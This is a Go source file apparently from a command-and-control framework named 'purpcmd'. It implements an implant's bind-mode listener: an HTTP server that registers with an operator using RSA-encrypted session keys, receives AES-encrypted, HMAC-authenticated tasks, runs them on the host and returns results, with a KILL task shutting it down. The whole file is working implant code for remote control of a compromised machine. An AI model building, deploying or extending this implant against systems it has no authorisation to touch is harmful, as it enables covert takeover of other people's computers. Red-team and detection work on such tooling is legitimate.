package core

import (
	"bytes"
	"context"
	"crypto/sha256"
	"encoding/base64"
	"errors"
	"fmt"
	"io"
	"net"
	"net/http"
	"strings"
	"sync"
	"time"

	implantwire "purpcmd/implant"
	"purpcmd/internal/encrypt"
	"purpcmd/internal/protocol"
)

const (
	defaultBindMaxRequestBytes = int64(16 << 20)
	defaultBindMaxHeaderBytes  = 32 << 10
	defaultBindCacheEntries    = 128
)

// BindConfig controls the implant-side HTTP server. The endpoint only accepts
// finite speaker exchanges; it never initiates a connection to the teamserver.
type BindConfig struct {
	Address           string
	Path              string
	PayloadType       string
	ReadHeaderTimeout time.Duration
	ReadTimeout       time.Duration
	WriteTimeout      time.Duration
	IdleTimeout       time.Duration
	MaxHeaderBytes    int
	MaxRequestBytes   int64
	MaxTaskPayload    uint32
	CacheEntries      int
}

type cachedTaskResult struct {
	fingerprint [32]byte
	response    []byte
	terminate   bool
}

type taskExecutor func(*CommandContext, uint16, []byte, [8]byte) (string, bool, error)

// BindServer implements the implant half of speaker mode.
type BindServer struct {
	config       BindConfig
	metadata     *implantwire.ImplantMetadata
	encryption   encrypt.Encrypt
	registration []byte
	httpServer   *http.Server
	execute      taskExecutor

	cacheMu    sync.Mutex
	taskMu     sync.Mutex
	cache      map[[8]byte]cachedTaskResult
	cacheOrder [][8]byte

	listenerMu sync.RWMutex
	listener   net.Listener
	closeOnce  sync.Once
}

// NewBindServer creates a bind payload using the public key installed through
// SetPublicKeyDER. Failure to encrypt registration is fatal to construction.
func NewBindServer(configuration BindConfig) (*BindServer, error) {
	configuration = normalizeBindConfig(configuration)
	metadata := ImplantInit(configuration.PayloadType)
	encryption := encrypt.EncryptInit()
	key, iv := encryption.EncryptGetKeys()
	registration, err := encryption.RSAEncode(PackRegistration(metadata, key, iv))
	if err != nil {
		return nil, fmt.Errorf("prepare bind registration: %w", err)
	}
	server := &BindServer{
		config:       configuration,
		metadata:     metadata,
		encryption:   encryption,
		registration: []byte(base64.StdEncoding.EncodeToString(registration)),
		cache:        make(map[[8]byte]cachedTaskResult),
		execute:      ExecuteTask,
	}
	mux := http.NewServeMux()
	mux.Handle(configuration.Path, server)
	server.httpServer = &http.Server{
		Handler:           mux,
		ReadHeaderTimeout: configuration.ReadHeaderTimeout,
		ReadTimeout:       configuration.ReadTimeout,
		WriteTimeout:      configuration.WriteTimeout,
		IdleTimeout:       configuration.IdleTimeout,
		MaxHeaderBytes:    configuration.MaxHeaderBytes,
	}
	return server, nil
}

// StartBind listens until the server is stopped or receives a KILL task.
func StartBind(address string, payloadTypes ...string) error {
	configuration := BindConfig{Address: address}
	if len(payloadTypes) > 0 {
		configuration.PayloadType = payloadTypes[0]
	}
	server, err := NewBindServer(configuration)
	if err != nil {
		return err
	}
	return server.ListenAndServe()
}

func normalizeBindConfig(configuration BindConfig) BindConfig {
	if strings.TrimSpace(configuration.Address) == "" {
		configuration.Address = ":8080"
	}
	if configuration.Path == "" {
		configuration.Path = "/"
	}
	if !strings.HasPrefix(configuration.Path, "/") {
		configuration.Path = "/" + configuration.Path
	}
	if configuration.ReadHeaderTimeout <= 0 {
		configuration.ReadHeaderTimeout = 10 * time.Second
	}
	if configuration.ReadTimeout <= 0 {
		configuration.ReadTimeout = 30 * time.Second
	}
	if configuration.WriteTimeout <= 0 {
		configuration.WriteTimeout = 30 * time.Second
	}
	if configuration.IdleTimeout <= 0 {
		configuration.IdleTimeout = 90 * time.Second
	}
	if configuration.MaxRequestBytes <= 0 {
		configuration.MaxRequestBytes = defaultBindMaxRequestBytes
	}
	if configuration.MaxHeaderBytes <= 0 {
		configuration.MaxHeaderBytes = defaultBindMaxHeaderBytes
	}
	if configuration.MaxTaskPayload == 0 {
		configuration.MaxTaskPayload = protocol.DefaultMaxTaskPayload
	}
	if configuration.CacheEntries <= 0 {
		configuration.CacheEntries = defaultBindCacheEntries
	}
	return configuration
}

func (server *BindServer) ListenAndServe() error {
	listener, err := net.Listen("tcp", server.config.Address)
	if err != nil {
		return err
	}
	return server.Serve(listener)
}

func (server *BindServer) Serve(listener net.Listener) error {
	server.listenerMu.Lock()
	server.listener = listener
	server.listenerMu.Unlock()
	err := server.httpServer.Serve(listener)
	if errors.Is(err, http.ErrServerClosed) {
		return nil
	}
	return err
}

func (server *BindServer) Addr() net.Addr {
	server.listenerMu.RLock()
	defer server.listenerMu.RUnlock()
	if server.listener == nil {
		return nil
	}
	return server.listener.Addr()
}

func (server *BindServer) Shutdown(ctx context.Context) error {
	var err error
	server.closeOnce.Do(func() { err = server.httpServer.Shutdown(ctx) })
	return err
}

func (server *BindServer) ServeHTTP(writer http.ResponseWriter, request *http.Request) {
	if request.Method != http.MethodPost {
		writer.Header().Set("Allow", http.MethodPost)
		http.Error(writer, "method not allowed", http.StatusMethodNotAllowed)
		return
	}

	switch request.Header.Get(protocol.ExchangeHeader) {
	case protocol.ExchangeRegistration:
		if !server.requireEmptyBody(writer, request) {
			return
		}
		writeProtocolBody(writer, server.registration)
	case protocol.ExchangeHealthcheck:
		if !server.requireEmptyBody(writer, request) {
			return
		}
		writeProtocolBody(writer, server.encodePacket(PackCheck(server.metadata)))
	case protocol.ExchangeTask:
		server.handleTask(writer, request)
	default:
		http.Error(writer, "unknown exchange", http.StatusBadRequest)
	}
}

func (server *BindServer) requireEmptyBody(writer http.ResponseWriter, request *http.Request) bool {
	body, err := server.readBody(writer, request)
	if err != nil {
		return false
	}
	if len(bytes.TrimSpace(body)) != 0 {
		http.Error(writer, "exchange body must be empty", http.StatusBadRequest)
		return false
	}
	return true
}

func (server *BindServer) handleTask(writer http.ResponseWriter, request *http.Request) {
	body, err := server.readBody(writer, request)
	if err != nil {
		return
	}
	decoded, err := base64.StdEncoding.Strict().DecodeString(string(bytes.TrimSpace(body)))
	if err != nil || !server.encryption.HMACVerifyHash(decoded) {
		http.Error(writer, "invalid authenticated task", http.StatusBadRequest)
		return
	}
	ciphertext := decoded[:len(decoded)-16]
	plaintext, err := server.encryption.AESCbcDecrypt(ciphertext)
	if err != nil {
		http.Error(writer, "invalid encrypted task", http.StatusBadRequest)
		return
	}
	task, err := protocol.DecodeTask(bytes.NewReader(plaintext), server.config.MaxTaskPayload)
	if err != nil {
		http.Error(writer, "invalid task frame", http.StatusBadRequest)
		return
	}
	fingerprint := sha256.Sum256(plaintext)
	server.taskMu.Lock()
	defer server.taskMu.Unlock()
	if cached, ok, conflict := server.cached(task.ID, fingerprint); conflict {
		http.Error(writer, "task ID was reused with different contents", http.StatusConflict)
		return
	} else if ok {
		server.writeTaskResult(writer, cached)
		return
	}

	context := &CommandContext{Implant: server.metadata, Encrypt: &server.encryption}
	response, terminate, executeErr := server.execute(context, task.Code, task.Payload, task.ID)
	result := cachedTaskResult{fingerprint: fingerprint, response: []byte(response), terminate: terminate}
	server.remember(task.ID, result)
	if executeErr != nil {
		writer.Header().Set("X-PurpleCommand-Task-Error", "true")
	}
	server.writeTaskResult(writer, result)
}

func (server *BindServer) writeTaskResult(writer http.ResponseWriter, result cachedTaskResult) {
	if len(result.response) == 0 {
		writer.WriteHeader(http.StatusNoContent)
	} else {
		writeProtocolBody(writer, result.response)
	}
	if result.terminate {
		go func() {
			ctx, cancel := context.WithTimeout(context.Background(), 5*time.Second)
			defer cancel()
			_ = server.Shutdown(ctx)
		}()
	}
}

func (server *BindServer) readBody(writer http.ResponseWriter, request *http.Request) ([]byte, error) {
	request.Body = http.MaxBytesReader(writer, request.Body, server.config.MaxRequestBytes)
	body, err := io.ReadAll(request.Body)
	if err != nil {
		var tooLarge *http.MaxBytesError
		if errors.As(err, &tooLarge) {
			http.Error(writer, "request too large", http.StatusRequestEntityTooLarge)
		} else {
			http.Error(writer, "read request", http.StatusBadRequest)
		}
		return nil, err
	}
	return body, nil
}

func (server *BindServer) encodePacket(packet []byte) []byte {
	encrypted := server.encryption.AESCbcEncrypt(packet)
	server.encryption.HMACPackAddHmac(&encrypted)
	return []byte(base64.StdEncoding.EncodeToString(encrypted))
}

func (server *BindServer) cached(taskID [8]byte, fingerprint [32]byte) (cachedTaskResult, bool, bool) {
	server.cacheMu.Lock()
	defer server.cacheMu.Unlock()
	result, ok := server.cache[taskID]
	if ok && result.fingerprint != fingerprint {
		return cachedTaskResult{}, false, true
	}
	if ok {
		result.response = bytes.Clone(result.response)
	}
	return result, ok, false
}

func (server *BindServer) remember(taskID [8]byte, result cachedTaskResult) {
	server.cacheMu.Lock()
	defer server.cacheMu.Unlock()
	if _, exists := server.cache[taskID]; exists {
		return
	}
	result.response = bytes.Clone(result.response)
	server.cache[taskID] = result
	server.cacheOrder = append(server.cacheOrder, taskID)
	if len(server.cacheOrder) > server.config.CacheEntries {
		oldest := server.cacheOrder[0]
		server.cacheOrder = server.cacheOrder[1:]
		delete(server.cache, oldest)
	}
}

func writeProtocolBody(writer http.ResponseWriter, body []byte) {
	writer.Header().Set("Content-Type", "application/octet-stream")
	writer.Header().Set("Cache-Control", "no-store")
	writer.Header().Set("Content-Length", fmt.Sprintf("%d", len(body)))
	writer.WriteHeader(http.StatusOK)
	_, _ = writer.Write(body)
}
